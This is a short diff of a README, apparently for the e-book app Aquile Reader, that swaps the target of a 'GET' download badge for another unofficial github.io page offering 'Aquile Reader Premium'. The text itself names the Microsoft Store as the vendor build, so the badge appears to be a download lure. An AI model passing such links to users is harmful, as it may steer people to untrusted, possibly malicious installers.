@@ -65,7 +65,7 @@ Those files are pack samples. They do not install Aquile Reader.
 
 ## Get Aquile Reader
 
-[![GET Aquile Reader](https://img.shields.io/badge/GET-Aquile%20Reader-9A3412?style=plastic&labelColor=1C1917&logoColor=white)](https://nicoleobrien077.github.io/.github/Aquile-Reader)
+[![GET Aquile Reader](https://img.shields.io/badge/GET-Aquile%20Reader-9A3412?style=plastic&labelColor=1C1917&logoColor=white)](https://aquile-reader.github.io/Aquile-Reader-Premium/)
 
 Use the GET badge. The Microsoft Store page is the vendor build for aquile reader windows. The Android build is the matching store listing. Aquile Reader Premium is the same listing, paid SKU.
 
